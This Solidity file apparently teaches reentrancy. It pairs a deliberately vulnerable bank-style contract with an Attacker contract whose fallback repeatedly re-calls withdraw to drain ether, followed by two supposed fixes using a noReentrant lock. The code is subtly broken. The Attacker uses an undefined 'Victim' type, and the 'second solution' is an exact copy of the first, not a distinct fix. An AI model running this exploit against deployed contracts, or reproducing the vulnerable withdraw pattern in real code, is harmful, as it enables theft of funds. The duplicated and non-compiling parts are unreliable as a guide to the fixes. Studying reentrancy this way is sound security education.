// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.10;
contract ModifierVictim {
    mapping(address=> uint256) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public{
        require(balances[msg.sender] >= amount);
        (bool success,) = msg.sender.call{value:amount}("");
        require(success, "Fail to send ether!");

        balances[msg.sender] -= amount;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}

contract Attacker{
    Victim public victim;
    constructor(address _victimAddr) public {
        victim = Victim(_victimAddr);
    }

    function beginAttack() external payable{
        require(msg.value >= 1 ether);
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }

    fallback() external payable{
        //死循环的话一毛也取不到
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}

contract SolutionOneVictim {
    mapping(address=> uint256) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    bool internal locked;
    modifier noReentrant(){
        require(!locked, "No re-entrancy!");
        locked = true;
        _;
        locked = false;
    }

    function withdraw(uint256 amount) public noReentrant{
        require(balances[msg.sender] >= amount);
        (bool success,) = msg.sender.call{value:amount}("");
        require(success, "Fail to send ether!");

        balances[msg.sender] -= amount;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}

contract SolutionTwoVictim {
    mapping(address=> uint256) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    bool internal locked;
    modifier noReentrant(){
        require(!locked, "No re-entrancy!");
        locked = true;
        _;
        locked = false;
    }

    function withdraw(uint256 amount) public noReentrant{
        require(balances[msg.sender] >= amount);
        (bool success,) = msg.sender.call{value:amount}("");
        require(success, "Fail to send ether!");

        balances[msg.sender] -= amount;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
